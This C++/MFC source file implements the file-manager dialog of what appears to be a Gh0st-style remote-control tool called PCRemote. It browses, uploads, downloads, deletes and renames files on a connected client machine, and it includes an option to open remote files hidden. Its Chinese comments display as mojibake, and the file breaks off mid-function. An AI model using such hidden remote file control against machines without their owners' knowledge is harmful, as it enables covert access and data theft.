// FileManagerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "FileTransferModeDlg.h"
#include "InputDialog.h"
#include "..\common\macros.h"

// CFileManagerDlg �Ի���

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

	CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CFileManagerDlg::IDD, pParent)
{
	SHFILEINFO sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = sfi.hIcon;

	HIMAGELIST hImageList;	//����ϵͳͼ���б�
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);


	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	sockaddr_in sockAddr;
	int nSockAddrLen = sizeof(sockaddr_in);
	memset(&sockAddr, 0, nSockAddrLen);

	//�õ����ӿͻ��˵�IP
	int nResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = (nResult != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";

	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, 
		m_pContext->m_DeCompressionBuffer.GetBuffer(1), 
		m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = FALSE;

	m_pSendBuffer = (BYTE*)LocalAlloc(LPTR, MAX_SEND_BUFFER);
}

CFileManagerDlg::~CFileManagerDlg()
{
	LocalFree(m_pSendBuffer);
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, &CFileManagerDlg::OnNMDblclkListLocal)
	ON_COMMAND(IDT_REMOTE_COPY, &CFileManagerDlg::OnRemoteCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, &CFileManagerDlg::OnUpdateRemoteCopy)
	ON_COMMAND(IDT_LOCAL_COPY, &CFileManagerDlg::OnLocalCopy)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_COPY, &CFileManagerDlg::OnUpdateLocalCopy)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, &CFileManagerDlg::OnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, &CFileManagerDlg::OnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, &CFileManagerDlg::OnDblclkListRemote)
	ON_COMMAND(IDT_LOCAL_PREV, &CFileManagerDlg::OnLocalPrev)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_PREV, &CFileManagerDlg::OnUpdateLocalPrev)
	ON_COMMAND(IDT_REMOTE_PREV, &CFileManagerDlg::OnRemotePrev)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, &CFileManagerDlg::OnUpdateRemotePrev)
	ON_COMMAND(IDT_LOCAL_VIEW, &CFileManagerDlg::OnLocalView)
	ON_COMMAND(IDM_LOCAL_LIST, &CFileManagerDlg::OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, &CFileManagerDlg::OnLocalReport)
	ON_COMMAND(IDM_LOCAL_BIGICON, &CFileManagerDlg::OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, &CFileManagerDlg::OnLocalSmallicon)
	ON_COMMAND(IDM_REMOTE_LIST, &CFileManagerDlg::OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, &CFileManagerDlg::OnRemoteReport)
	ON_COMMAND(IDM_REMOTE_BIGICON, &CFileManagerDlg::OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_SMALLICON, &CFileManagerDlg::OnRemoteSmallicon)
	ON_COMMAND(IDT_REMOTE_VIEW, &CFileManagerDlg::OnRemoteView)
	ON_COMMAND(IDT_LOCAL_DELETE, &CFileManagerDlg::OnLocalDelete)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_DELETE, &CFileManagerDlg::OnUpdateLocalDelete)
	ON_COMMAND(IDT_LOCAL_NEWFOLDER, &CFileManagerDlg::OnLocalNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_NEWFOLDER, &CFileManagerDlg::OnUpdateLocalNewfolder)
	ON_COMMAND(IDT_LOCAL_STOP, &CFileManagerDlg::OnLocalStop)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_STOP, &CFileManagerDlg::OnUpdateLocalStop)
	ON_COMMAND(IDT_REMOTE_DELETE, &CFileManagerDlg::OnRemoteDelete)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, &CFileManagerDlg::OnUpdateRemoteDelete)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, &CFileManagerDlg::OnRemoteNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, &CFileManagerDlg::OnUpdateRemoteNewfolder)
	ON_COMMAND(IDT_REMOTE_STOP, &CFileManagerDlg::OnRemoteStop)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, &CFileManagerDlg::OnUpdateRemoteStop)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, &CFileManagerDlg::OnNMRClickListLocal)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, &CFileManagerDlg::OnNMRClickListRemote)
	ON_COMMAND(IDM_TRANSFER, &CFileManagerDlg::OnTransfer)
	ON_COMMAND(IDM_RENAME, &CFileManagerDlg::OnRename)
	ON_COMMAND(IDM_DELETE, &CFileManagerDlg::OnDelete)
	ON_COMMAND(IDM_NEWFOLDER, &CFileManagerDlg::OnNewfolder)
	ON_COMMAND(IDM_LOCAL_OPEN, &CFileManagerDlg::OnLocalOpen)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, &CFileManagerDlg::OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, &CFileManagerDlg::OnRemoteOpenHide)
	ON_COMMAND(IDM_REFRESH, &CFileManagerDlg::OnRefresh)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, &CFileManagerDlg::OnLvnEndlabeleditListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, &CFileManagerDlg::OnLvnEndlabeleditListRemote)
END_MESSAGE_MAP()


// CFileManagerDlg ��Ϣ�������

int GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO sfi;
	if(dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo(
		lpFileName,
		dwFileAttributes,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES);

	return sfi.iIcon;
}

BOOL CFileManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	RECT rect;
	GetClientRect(&rect);

	//Ϊ��ʹ�������Ӵ���
	if (!m_wndToolBar_Local.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_LOCAL_TOOLBAR) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1))
	{
		TRACE0("Failed to create toolbar");
		return FALSE;
	}
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);
	m_wndToolBar_Local.LoadTrueColorToolBar(
		24,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE);
	// ���������ť
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);


	if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_REMOTE_TOOLBAR) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR2))
	{
		TRACE0("Failed to create toolbar");
		return FALSE;
	}
	m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);
	m_wndToolBar_Remote.LoadTrueColorToolBar(
		24,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE);
	// ���������ť
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);

	//���ñ���
	CString str;
	str.Format("\\\\%s - �ļ�����", m_IPAddress);
	SetWindowText(str);

	//Ϊ�б�����ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);

	//����Զ��driverͼ���б�
	m_ImageListLargeForRemoteDriver.Create(32, 32, ILC_COLOR32, 5, 1);
	m_ImageListSmallForRemoteDriver.Create(16, 16, ILC_COLOR32, 5, 1);

	//��������������״̬��
	if (!m_wndStatusBar.Create(this) || 
		!m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return FALSE;
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);	//���ý�������Χ
	m_ProgressCtrl->SetPos(20);			//���ý�������ǰλ��

	//��ʼ�������������б�����ʾ�����������б�
	FixedLocalDriveList();
	//��ʼ���ͻ����������б�����ʾ�ͻ����������б�
	FixedRmoteDriveList();

	m_bDragging = FALSE;
	m_nDragIndex = -1;
	m_nDropIndex = -1;

	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->m_hWnd, SHACF_FILESYSTEM);

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	if(!m_wndStatusBar.m_hWnd)			//״̬����û����
		return ;

	// ��λ״̬��
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ������
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);

	GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 100) / 2);
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 28, cx, (cy - 100) / 2);
	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);


	GetClientRect(&rect);
	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);
}

void CFileManagerDlg::FixedLocalDriveList()
{
	char szDrive[MAX_PATH] = {0};
	char *pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0));

	//��ʼ���б���Ϣ
	m_list_local.InsertColumn(0, "����", LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);

	GetLogicalDriveStrings(MAX_PATH, szDrive);
	pDrive = szDrive;

	char szFileSystem[MAX_PATH];
	unsigned __int64 HDTotalSpace = 0;
	unsigned __int64 HDFreeSpace  = 0;
	unsigned long TotalMB = 0; //�ܴ�С
	unsigned long FreeMB  = 0;  //ʣ��ռ�

	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		memset(szFileSystem, 0, sizeof(szFileSystem));
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, szFileSystem, MAX_PATH);
		int nFileSystemLen = lstrlen(szFileSystem) + 1;

		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDTotalSpace, NULL))
		{
			TotalMB = HDTotalSpace / 1024 /1024;
			FreeMB  = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			TotalMB = 0;
			FreeMB  = 0;
		}

		int nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));
		m_list_local.SetItemData(nItem, 1);
		if (lstrlen(szFileSystem) == 0)
		{
			SHFILEINFO sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		} 
		else
		{
			m_list_local.SetItemText(nItem, 1, szFileSystem);
		}

		CString str;
		str.Format("%10.1f GB", (float)TotalMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}

	//���ñ��ص�ǰ·��
	m_Local_Path = "";
	m_Local_Directory_ComboBox.ResetContent();
}

void CFileManagerDlg::OnNMDblclkListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	//LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return ;
	FixedLocalFileList();
	*pResult = 0;

}

void CFileManagerDlg::FixedLocalFileList(CString directory /* = "" */)
{
	if (directory.GetLength() == 0)
	{
		int nItem = m_list_local.GetSelectionMark();

		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)	//������ѡ�У�������Ŀǰ
				directory = m_list_local.GetItemText(nItem, 0);
		} 
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}

	//��ȡ��Ŀ¼
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	else if (directory != ".")		//����ˢ�µ�ǰĿ¼
	{
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}

	//if���������ĸ�Ŀ¼�����ش����б�
	if (m_Local_Path.GetLength() == 0)
	{
		FixedLocalDriveList();
		return ;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	//�ؽ��б���
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0));

	m_list_local.InsertColumn(0, "����", LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);

	int nItemIndex = 0;
	m_list_local.SetItemData(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_NORMAL)),
		1);

	//iΪ0ʱ��Ŀ¼��iΪ1ʱ���ļ�
	for (int i = 0; i < 2; i++)
	{
		CFileFind finder;
		BOOL bContinue;
		bContinue = finder.FindFile(m_Local_Path + "*.*");
		while(bContinue)
		{
			bContinue = finder.FindNextFile();
			if(finder.IsDots())
				continue;

			BOOL bIsInsert = (!finder.IsDirectory() == i);

			if(!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, finder.GetFileName(), 
				GetIconIndex(finder.GetFilePath(), GetFileAttributes(finder.GetFilePath())));
			m_list_local.SetItemData(nItem, finder.IsDirectory());
			SHFILEINFO sfi;
			SHGetFileInfo(finder.GetFilePath(), 0, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME);
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			if(i)
			{
				str.Format("%10d KB", finder.GetLength() / 1024 + (finder.GetLength() % 1024 ? 1 : 0));
				m_list_local.SetItemText(nItem, 1, str);
			}
			CTime time;
			finder.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));

		}
	}
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	int Index = strPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strPath;
	}
	CString str = strPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strPath = "";
		return strPath;
	}
	strPath = str.Left(Index);

	if(strPath.Right(1) != "\\")
		strPath += "\\";

	return strPath;
}

void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
	if(pDragList == pDropList)
		return ;

	pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);

	if (pDropList == &m_list_local)
	{
		OnRemoteCopy();
	} 
	else if(pDropList == &m_list_remote)
	{
		OnLocalCopy();
	}
	else
	{
		//������
		return ;
	}

	m_nDropIndex = -1;
}

void CFileManagerDlg::OnRemoteCopy()
{
	// TODO: �ڴ���������������
	m_bIsUpload = false;
	EnableControl(FALSE);

	//�����ͨ�������ק�ģ��ҵ�Drop���ĸ��ļ���
	if(m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_strCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	else
		m_strCopyDestFolder = "";

	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);

		//�����Ŀ¼
		if(m_list_remote.GetItemData(nItem))
			file += '\\';

		m_Remote_Download_Job.AddHead(file);
	}

	//���͵�һ����������
	SendDownloadJob();
}


void CFileManagerDlg::OnLocalCopy()
{
	// TODO: �ڴ���������������
	m_bIsUpload = true;

	//�������ק���ļ������Ƶ��ͻ���ȥ��
	if(m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_strCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);	//��ȡ�ļ����Ƶ���Ŀ���ļ���
	else
		m_strCopyDestFolder = "";

	//�����ϴ������б�
	m_Remote_Upload_Job.RemoveAll();
	POSITION pos = m_list_local.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString file = m_Local_Path + m_list_local.GetItemText(nItem, 0);

		//�����Ŀ¼
		if (m_list_local.GetItemData(nItem))
		{
			file += "\\";
			FixedUploadDirectory(file.GetBuffer(0));
		} 
		else
		{
			m_Remote_Upload_Job.AddTail(file);
		}
	}

	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "�ļ���Ϊ��", "����", MB_OK|MB_ICONWARNING);
		return ;
	}

	EnableControl(FALSE);
	SendUploadJob();
}


void CFileManagerDlg::OnBegindragListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	m_nDragIndex = pNMLV->iItem;

	if(m_list_local.GetItemText(m_nDragIndex, 0) == "..")
		return ;

	//���֮ǰremote�б���ѡ�����ȡ��ѡ��
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		m_list_remote.SetItemState(nItem, 0, LVIS_SELECTED | LVIS_FOCUSED);
	}

	if(m_list_local.GetSelectedColumn() > 1)
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor);

	m_bDragging = TRUE;
	m_nDropIndex = -1;
	m_pDragList = &m_list_local;
	m_pDropWnd = &m_list_local;

	//�������е������Ϣ
	SetCapture();
	*pResult = 0;
}


void CFileManagerDlg::OnBegindragListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	m_nDragIndex = pNMLV->iItem;

	if(m_list_remote.GetItemText(m_nDragIndex, 0) == "..")
		return ;

	//���֮ǰlocal�б���ѡ�����ȡ��ѡ��
	POSITION pos = m_list_local.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		m_list_local.SetItemState(nItem, 0, LVIS_SELECTED | LVIS_FOCUSED);
	}

	if(m_list_remote.GetSelectedColumn() > 1)
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor);

	m_bDragging = TRUE;
	m_nDropIndex = -1;
	m_pDragList = &m_list_remote;
	m_pDropWnd = &m_list_remote;

	//�������е������Ϣ
	SetCapture();
	*pResult = 0;
}


void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_bDragging)
	{
		CPoint pt(point);
		ClientToScreen(&pt);

		//// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd *pDropWnd = WindowFromPoint(pt);
		ASSERT(pDropWnd);

		// If we drag outside current window we need to adjust the highlights displayed
		if (pDropWnd != m_pDropWnd)
		{
			if (m_nDropIndex != -1)//���֮ǰ��һ������DropList�����m_nDropIndex�õ������λ�ù�����λ������ø�����֮������Ƴ�DropList����Ҫ��֮ǰ���õĸ�����ȡ����	
			{
				CListCtrl *pList = (CListCtrl*)m_pDropWnd;
				VERIFY(pList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED));
				// redraw item
				VERIFY(pList->RedrawItems(m_nDropIndex, m_nDropIndex));
				pList->UpdateWindow();
				m_nDropIndex = -1;
			}
		}

		// Save current window pointer as the CListCtrl we are dropping onto
		m_pDropWnd = pDropWnd;

		// Convert from screen coordinates to drop target client coordinates
		pDropWnd->ScreenToClient(&pt);

		// if window is CListCtrl
		if (pDropWnd->IsKindOf(RUNTIME_CLASS(CListCtrl)))
		{
			//Note that we can drop here
			SetCursor(m_hCursor);

			if(m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
				return ;

			UINT uFlags;
			CListCtrl *pList = (CListCtrl*)pDropWnd;

			// Turn off hilight for previous drop target
			pList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);
			// Redraw previous item
			pList->RedrawItems(m_nDropIndex, m_nDropIndex);

			// Get the item that is below cursor
			m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);

			if (m_nDropIndex != -1)
			{
				// Highlight it
				pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
				// Redraw item
				pList->RedrawItems(m_nDropIndex, m_nDropIndex);
				pList->UpdateWindow();
			}
		}
		else
		{
			//If we are not hovering over a CListCtrl, change the cursor
			// to note that we cannot drop here
			SetCursor(LoadCursor(NULL, IDC_NO));
		}
	}
	CDialogEx::OnMouseMove(nFlags, point);
}


void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_bDragging)
	{
		// release mouse capture
		ReleaseCapture();

		m_bDragging = FALSE;

		CPoint pt(point);
		ClientToScreen(&pt);

		CWnd *pDropWnd = WindowFromPoint(pt);
		ASSERT(pDropWnd);

		if (pDropWnd->IsKindOf(RUNTIME_CLASS(CListCtrl)))
		{
			m_pDropList = (CListCtrl *)pDropWnd;
			DropItemOnList(m_pDragList, m_pDropList);
		}
	}
	CDialogEx::OnLButtonUp(nFlags, point);
}

void CFileManagerDlg::FixedRmoteDriveList()
{
	// 	HIMAGELIST hImageListLarge = NULL;
	// 	HIMAGELIST hImageListSmall = NULL;
	// 	BOOL ret = Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	//ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	//ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	//��shell32.dll��ȡdriverͼ�꣬for m_list_remote
	ExtractShellIconForDriver();

	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0));

	m_list_remote.InsertColumn(0, "����", LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);

	char *pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;

	unsigned long TotalMB = 0;	//�ܴ�С
	unsigned long FreeMB  = 0;	//ʣ��ռ�
	char		  FileSystem[MAX_PATH];

	int nIconIndex = -1;

	for (int i = 0; pDrive[i] != '\0'; )
	{
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 0;
		}
		else
		{
			switch(pDrive[i + 1])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 1;
				break;
			case DRIVE_FIXED:
				nIconIndex = 2;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 3;
				break;
			case DRIVE_CDROM:
				nIconIndex = 4;
				break;
			default:
				nIconIndex = 2;
				break;	
			}
		}

		//��������
		CString str;
		str.Format("%c:\\", pDrive[i]);
		int nItem = m_list_remote.InsertItem(i, str, nIconIndex);
		m_list_remote.SetItemData(nItem, 1);

		//��ʾ���̴�С
		memcpy(&TotalMB, pDrive + i + 2, 4);
		memcpy(&FreeMB,  pDrive + i + 6, 4);
		str.Format("%10.1f GB", (float)TotalMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);

		i += 10;

		char *lpFileSystemName = NULL;
		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		char *szName = NULL;
		//��������Ϊ�վ���ʾ��������
		szName = (lstrlen(lpFileSystemName) == 0) ? lpTypeName : lpFileSystemName;
		m_list_remote.SetItemText(nItem, 1, szName);

		i += lstrlen(pDrive + i) + 1;
	}

	m_Remote_Path = "";
	m_Remote_Directory_ComboBox.ResetContent();
}

void CFileManagerDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	CoUninitialize();
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialogEx::OnClose();
}

void CFileManagerDlg::OnReceiveComplete()
{
	switch(m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST:	//�ļ��б�
		FixedRemoteFileList(m_pContext->m_DeCompressionBuffer.GetBuffer(0),
			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_FILE_SIZE:	// �����ļ�ʱ�ĵ�һ�����ݰ����ļ���С�����ļ���
		CreateLocalRecvFile();
		break;
